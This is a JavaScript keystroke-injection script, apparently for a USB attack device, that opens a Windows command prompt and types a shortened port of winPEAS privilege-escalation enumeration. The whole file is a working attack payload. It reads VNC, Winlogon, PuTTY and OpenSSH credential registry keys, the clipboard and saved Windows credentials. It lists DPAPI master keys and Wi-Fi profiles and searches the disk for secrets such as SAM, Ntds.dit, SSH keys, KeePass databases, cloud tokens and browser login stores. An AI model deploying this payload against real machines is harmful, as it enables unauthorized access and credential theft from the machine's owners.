/*
winPeas.bat commands / thee is only a part of functions, to get fast results to stdout
its not beautiful but nice to have
winPEAS.bat by peass-ng
author: Klau5t4ler0x90
*/

// sets typing speed to "natural"
function natural() {
    typingSpeed(100,150)	// Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)
  }
  
  // sets typing speed as fast as possible
  function fast() {
    typingSpeed(0,0)
  }
  
  // Open an interactive cmd console (Windows)
  function cmd() {
      press("GUI r");
      delay(500);
      type("cmd\n")
  }
  
  // List SystemInfo
  function systeminfo() {
    type("systeminfo");
    press("ENTER");
    press("ENTER");
  }
  
  // List Hotfixes
  function ListHotFixes() {
    type("wmic qfe get Caption,Description,HotFixID,InstalledOn");
    press("ENTER");
    press("ENTER");
  }
  
  // List Audit Settings [i] Check what is being logged
  function AuditSettings() {
    type("echo 'List Audit Settings [i] Check what is being logged'");
    press("ENTER");
    type("reg QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit");
    press("ENTER");
    press("ENTER");
  }
  
  // List WEFSettings [i] Check where are being sent the logs
  function WEFSettings() {
    type("echo 'List WEFSettings [i] Check where are being sent the logs'");
    press("ENTER");
    type("reg QUERY HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\EventLog\\EventForwarding\\SubscriptionManager");
    press("ENTER");
    press("ENTER");
  }
  
  // Laps install check
  function LapsInstallCheck() {
    type("reg QUERY HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\EventLog\\EventForwarding\\SubscriptionManager");
    press("ENTER");
    press("ENTER");
  }
  
  // WindowsLAPSInstallCheck
  function WindowsLAPSInstallCheck1() {
    type("echo '[i] Check what is being logged: 0x00 Disabled, 0x01 Backup to Entra, 0x02 Backup to Active Directory'");
    press("ENTER");
    type("reg QUERY \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Policies\\LAPS\" /v BackupDirectory");
    press("ENTER");
    press("ENTER");
  }
  // WindowsLAPSInstallCheck
  function WindowsLAPSInstallCheck2() {
    type("echo '[i] Check what is being logged: 0x00 Disabled, 0x01 Backup to Entra, 0x02 Backup to Active Directory'");
    press("ENTER");
    type("reg QUERY \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\LAPS\" /v BackupDirectory");
    press("ENTER");
    press("ENTER");
  }
  
  //LSAProtectionCheck  [i] Active if "1"
  function LSAProtectionCheck() {
    type("echo \"LSA Protection?\" [i] Active if \"1\"");
    press("ENTER");
    type("reg QUERY \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\LSA\" /v RunAsPPL");
    press("ENTER");
    type("echo \"Credential Guard?\" [i] Active if \"1\" or \"2\"");
    press("ENTER");
    type("reg QUERY \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\LSA\" /v LsaCfgFlags");
    press("ENTER");
    press("ENTER");
  }
  
  //LogonCredentialsPlainInMemory
  function WDigest() {
    type("echo [i] Plain-text creds in memory if \"1\"");
    press("ENTER");
    type("reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential");
    press("ENTER");
    press("ENTER");
  }
  
  //cached Creds
  function CachedCreds() {
    type("echo '[i] You need System-rights to extract them'");
    press("ENTER");
    type("reg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v CACHEDLOGONSCOUNT");
    press("ENTER");
    press("ENTER");
  }
  
  //UACSettings
  function UACSettings() {
    type("echo '[i] If the results read ENABLELUA REG_DWORD 0x1, part or all of the UAC components are on [?] https://book.hacktricks.wiki/en/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control.html#very-basic-uac-bypass-full-file-system-access'");
    press("ENTER");
    type("reg QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLUA");
    press("ENTER");
    press("ENTER");
  }
  
  //somthing else
  function MoreInformations() {
    type("echo \"Registered Anti-Virus:\"");
    press("ENTER");
    type("WMIC /Node:localhost /Namespace:\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List");
    press("ENTER");
    type("echo 'Powershell Settings: \"Powershell Version 2 ?\" and \"Powershell Version 5 ?\"'");
    press("ENTER");
    type("reg QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngine /v PowerShellVersion");
    press("ENTER");
    press("ENTER");
    type("reg QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine /v PowerShellVersion");
    press("ENTER");
    press("ENTER");
    type("echo 'PowerShell History File?'");
    press("ENTER");
    type("dir \"%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\" 2>nul");
    press("ENTER");
    type("echo 'MOUNTED DISKS:'");
    press("ENTER");
    type("(wmic logicaldisk get caption 2>nul | more) || (fsutil fsinfo drives 2>nul)");
    press("ENTER");
    press("ENTER");
    type("echo Enviorment");
    press("ENTER");
    type("set");
    press("ENTER");
    press("ENTER");
  }
  
  
  //InstalledSoftware
  function InstalledSoftware() {
    type("echo Installed Software:");
    press("ENTER");
    type("dir /b \"C:\\Program Files\" \"C:\\Program Files (x86)\" | sort");
    press("ENTER");
    press("ENTER");
    type("reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s | findstr InstallLocation | findstr \":\\\\\"");
    press("ENTER");
    press("ENTER");
    type("reg query HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\ /s | findstr InstallLocation | findstr \":\\\\\"");
    press("ENTER");
    press("ENTER");
  }
  
  //RemodeDeskCredMgr  (HiddenCheck)
  function RemodeDeskCredMgr() {
    //type("echo Remote Desktop Credentials Manager:");
    type("IF exist \"%LOCALAPPDATA%\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings\" ECHO.Found: RDCMan.settings in %AppLocal%\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings, check for credentials in .rdg files");
    press("ENTER");
    press("ENTER");
  }
  
  // Check WSUS 
  function Wsus() {
    type("echo Checking if wsus is unencrypted:");
    press("ENTER");
    type("reg query HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\ 2>nul | findstr /i \"wuserver\" | findstr /i \"http://\"");
    press("ENTER");
    press("ENTER");
  }
    
  //RunningProcesses
  function RunningProcesses() {
    type("echo Running Processes:");
    press("ENTER");
    type("tasklist /SVC");
    press("ENTER");
    press("ENTER");
  }
  
  //RunAtStartup
  function RunAtStartup() {
    type("These Programs run at Startup:");
    press("ENTER");
    type("reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 2>nul");
    press("ENTER");
    type("reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce 2>nul");
    press("ENTER");
    type("reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 2>nul");
    press("ENTER");
    type("reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 2>nul");
    press("ENTER");
    type("icacls \"%programdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" 2>nul | findstr /i \"(F) (M) (W) :\\\" | findstr /i \":\\\\ everyone authenticated users todos %username%\"");
    press("ENTER");
    type("icacls \"%programdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\*\" 2>nul | findstr /i \"(F) (M) (W) :\\\" | findstr /i \":\\ everyone authenticated users todos %username%\"");
    press("ENTER");
    type("icacls \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" 2>nul | findstr /i \"(F) (M) (W) :\\\" | findstr /i \":\\ everyone authenticated users todos %username%\"");
    press("ENTER");
    type("icacls \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\*\" 2>nul | findstr /i \"(F) (M) (W) :\\\" | findstr /i \":\\ everyone authenticated users todos %username%\"");
    press("ENTER");
    type("echo schtask:")
    press("ENTER");
    type("schtasks /query /fo TABLE /nh | findstr /v /i \"disable deshab informa\")");
    press("ENTER");
    press("ENTER");
  }
  
  // AlwaysInstallElevated
  function AlwInstElev() {
    type("echo \"Check AlwaysInstallElevated:\"");
    press("ENTER");
    type("reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated");
    press("ENTER");
    type("reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated");
    press("ENTER");
    type("echo \"[i] If '1' then you can install a .msi file with admin privileges ;)\"");
    press("ENTER");
  }
  
  //NetworkShares
  function NetShares() {
    type("net share");
    press("ENTER");
    press("ENTER");
  }
  
  //NetworkInterfaces
  function ipconfig() {
    type("ipconfig  /all");
    press("ENTER");
    press("ENTER");
  }
  
  //Network used ports
  function UsedPorts() {
    type("netstat -ano | findstr /i listen");
    press("ENTER");
    press("ENTER");
  }
  
  //Network Firewall
  function FireWall() {
    type("netsh firewall show stat");
    press("ENTER");
    type("netsh firewall show config");
    press("ENTER");
    press("ENTER");
  }
  
  //ARP
  function ARPcache() {
    type("arp -A");
    press("ENTER");
    press("ENTER");
  }
  
  //NetworkRoutes
  function NetworkRoutes() {
    type("route print");
    press("ENTER");
    press("ENTER");
  }
  
  //WindowsHostsFile
  function WindowsHostsFile() {
    type("echo WindowsHostsFile");
    press("ENTER");
    type("type C:\\WINDOWS\\System32\\drivers\\etc\\hosts | findstr /v \"^#\"");
    press("ENTER");
    press("ENTER");
  }
  
  //DNSCache
  function DNSCache() {
    type("echo DNSCache");
    press("ENTER");
    type("ipconfig /displaydns | findstr \"Record\" | findstr \"Name Host\"");
    press("ENTER");
    press("ENTER");
  }
  
  //WifiNetworks
  function WifiNetworks() {
    type("echo WifiNetworks, extrakt the wifi keys with 'netsh wlan show profiles name=<hereSSID> key=clear'");
    press("ENTER");
    type("netsh wlan show all");
    press("ENTER");
    press("ENTER");
  }
  
  //UserInfo
  function UserInfo() {
    type("net user %username%");
    press("ENTER");
    type("net user %username% /domain 2>nul");
    press("ENTER");
    type("whoami /all");
    press("ENTER");
    press("ENTER");
  }
  
  //InfoUsers
  function InfoUsers() {
    type("net user");
    press("ENTER");
    press("ENTER");
  }
  
  //local groups
  function LocalGroups() {
    type("net localgroup");
    press("ENTER");
    press("ENTER");
  }
  
  //Administratoren
  function BasicUserInfoAdminGroups() {
    type("echo 'Administratoren:'");
    press("ENTER");
    type("net localgroup Administrators 2>nul");
    press("ENTER");
    type("net localgroup Administradores 2>nul");
    press("ENTER");
    type("net localgroup Administratoren 2>nul");
    press("ENTER");
    press("ENTER");
  }
  
  //BasicUserInfoLoggedUser
  function BasicUserInfoLoggedUser() {
    type("quser");
    press("ENTER");
    press("ENTER");
  }
  
  //Kerberostickets
  function klist() {
    type("klist");
    press("ENTER");
    press("ENTER");
  }
  
  //Get-Powershell Clipboard
  function PowershellClipboard() {
    type("powershell -command \"Get-Clipboard\" 2>nul");
    press("ENTER");
    press("ENTER");
  }
  
  //WindowsCredentials
  function WindowsCreds() {
    type("cmdkey /list");
    press("ENTER");
    press("ENTER");
  }
  
  //DPAPIMasterKeys
  function DPAPIKeys() {
    type("echo 'Extract DPAPI MASTER KEYS");
    press("ENTER");
    type("powershell -command \"Get-ChildItem %appdata%\\Microsoft\\Protect\" 2>nul");
    press("ENTER");
    type("powershell -command \"Get-ChildItem %localappdata%\\Microsoft\\Protect\" 2>nul");
    press("ENTER");
    type("dir /b/a %appdata%\\Microsoft\\Credentials\\ 2>nul");
    press("ENTER");
    type("dir /b/a %localappdata%\\Microsoft\\Credentials\\ 2>nul");
    press("ENTER");
    type("");
    press("ENTER");
    press("ENTER");
  }
  
  function McAffeeSitelist() {
    type("echo McAffeeSiteList");
    press("ENTER");
    type("cd %ProgramFiles% 2>nul");
    press("ENTER");
    type("dir /s SiteList.xml 2>nul");
    press("ENTER");
    type("cd %ProgramFiles(x86)% 2>nul");
    press("ENTER");
    type("dir /s SiteList.xml 2>nul");
    press("ENTER");
    type("cd \"%windir%\..\Documents and Settings\" 2>nul");
    press("ENTER");
    type("dir /s SiteList.xml 2>nul");
    press("ENTER");
    type("cd %windir%\..\Users 2>nul");
    press("ENTER");
    type("dir /s SiteList.xml 2>nul");
    press("ENTER");
    press("ENTER");
  }
  
  //GPPPassword
  function GPPPassword() {
    type("echo GPPPassword");
    press("ENTER");
    type("cd \"%SystemDrive%\\Microsoft\\Group Policy\\history\" 2>nul");
    press("ENTER");
    type("dir /s/b Groups.xml == Services.xml == Scheduledtasks.xml == DataSources.xml == Printers.xml == Drives.xml 2>nul");
    press("ENTER");
    type("cd \"%windir%\\..\\Documents and Settings\\All Users\\Application Data\\Microsoft\\Group Policy\\history\" 2>nul");
    press("ENTER");
    type("dir /s/b Groups.xml == Services.xml == Scheduledtasks.xml == DataSources.xml == Printers.xml == Drives.xml 2>nul");
    press("ENTER");
    press("ENTER");
  }
  
  //CloudCreds
  function CloudCreds() {
    type("echo CloudCreds");
    press("ENTER");
    type("cd \"%SystemDrive%\\Users\"");
    press("ENTER");
    type("dir /s/b .aws == credentials == gcloud == credentials.db == legacy_credentials == access_tokens.db == .azure == accessTokens.json == azureProfile.json 2>nul");
    press("ENTER");
    type("cd \"%windir%\\..\\Documents and Settings\"");
    press("ENTER");
    type("dir /s/b .aws == credentials == gcloud == credentials.db == legacy_credentials == access_tokens.db == .azure == accessTokens.json == azureProfile.json 2>nul");
    press("ENTER");
    press("ENTER");
  }
  
  //AppCMD
  function AppCMD() {
    type("IF EXIST %systemroot%\\system32\\inetsrv\\appcmd.exe ECHO.%systemroot%\\system32\inetsrv\\appcmd.exe exists.");
    press("ENTER");
    press("ENTER");
  }
  
  //RegFilesCredentials
  function RegFilesCredentials() {
    type("echo RegFilesCredentials");
    press("ENTER");
    type("reg query HKCU\\Software\\ORL\\WinVNC3\\Password 2>nul");
    press("ENTER");
    type("reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password 2>nul");
    press("ENTER");
    type("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" 2>nul | findstr /i \"DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername\"");
    press("ENTER");
    type("reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s 2>nul");
    press("ENTER");
    type("reg query HKCU\\Software\\TightVNC\\Server 2>nul");
    press("ENTER");
    type("reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /s 2>nul");
    press("ENTER");
    type("ECHO.Looking inside HKCU\\Software\\OpenSSH\\Agent\\Keys");
    press("ENTER");
    type("reg query HKCU\\Software\\OpenSSH\\Agent\\Keys /s 2>nul");
    press("ENTER");
    type("cd %USERPROFILE% 2>nul && dir /s/b *password* == *credential* 2>nul");
    press("ENTER");
    type("cd ..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..");
    press("ENTER");
    type("dir /s/b /A:-D RDCMan.settings == *.rdg == SCClient.exe == *_history == .sudo_as_admin_successful == .profile == *bashrc == httpd.conf == *.plan == .htpasswd == .git-credentials == *.rhosts == hosts.equiv == Dockerfile == docker-compose.yml == appcmd.exe == TypedURLs == TypedURLsTime == History == Bookmarks == Cookies == \"Login Data\" == places.sqlite == key3.db == key4.db == credentials == credentials.db == access_tokens.db == accessTokens.json == legacy_credentials == azureProfile.json == unattend.txt == access.log == error.log == *.gpg == *.pgp == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12 == *.der == *.csr == *.cer == known_hosts == id_rsa == id_dsa == *.ovpn == anaconda-ks.cfg == hostapd.conf == rsyncd.conf == cesi.conf == supervisord.conf == tomcat-users.xml == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == unattend.xml == unattended.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == groups.xml == services.xml == scheduledtasks.xml == printers.xml == drives.xml == datasources.xml == php.ini == https.conf == https-xampp.conf == httpd.conf == my.ini == my.cnf == access.log == error.log == server.xml == SiteList.xml == ConsoleHost_history.txt == setupinfo == setupinfo.bak 2>nul | findstr /v \".dll\"");
    press("ENTER");
    type("cd inetpub 2>nul && (dir /s/b web.config == *.log & cd ..)");
    press("ENTER");
    press("ENTER");
  }
  
  //execution:
  layout('de');			// DE keyboard layout
  fast();           //type speed
  
  cmd();            //open cmd
  delay(500);
  
  //type commands:
  
  systeminfo();
  delay(1000);
  ListHotFixes();
  delay(1000);
  AuditSettings();
  delay(1000);
  WEFSettings();
  delay(1000);
  LapsInstallCheck();
  delay(1000);
  WindowsLAPSInstallCheck1();
  delay(1000);
  WindowsLAPSInstallCheck2();
  delay(1000);
  LSAProtectionCheck();
  delay(1000);
  WDigest();
  delay(1000);
  CachedCreds();
  delay(1000);
  UACSettings();
  delay(1000);
  MoreInformations();
  delay(1000);
  InstalledSoftware();
  delay(1000);
  RemodeDeskCredMgr();
  delay(1000);
  Wsus();
  delay(1000);
  RunningProcesses();
  delay(1000);
  RunAtStartup();
  delay(1000);
  AlwInstElev();
  delay(1000);
  NetShares();
  delay(1000);
  UsedPorts();
  delay(1000);
  FireWall();
  delay(1000);
  ARPcache();
  delay(1000);
  NetworkRoutes();
  delay(1000);
  WindowsHostsFile();
  delay(1000);
  DNSCache();
  delay(1000);
  WifiNetworks();
  delay(1000);
  UserInfo();
  delay(1000);
  InfoUsers();
  delay(1000);
  LocalGroups();
  delay(1000);
  BasicUserInfoAdminGroups();
  delay(1000);
  BasicUserInfoLoggedUser();
  delay(1000);
  klist();
  delay(1000);
  PowershellClipboard();
  delay(1000);
  WindowsCreds();
  delay(1000);
  DPAPIKeys();
  delay(1000);
  McAffeeSitelist();
  delay(1000);
  GPPPassword();
  delay(1000);
  CloudCreds();
  delay(1000);
  AppCMD();
  delay(1000);
  RegFilesCredentials();
  delay(1000);
  
  //ready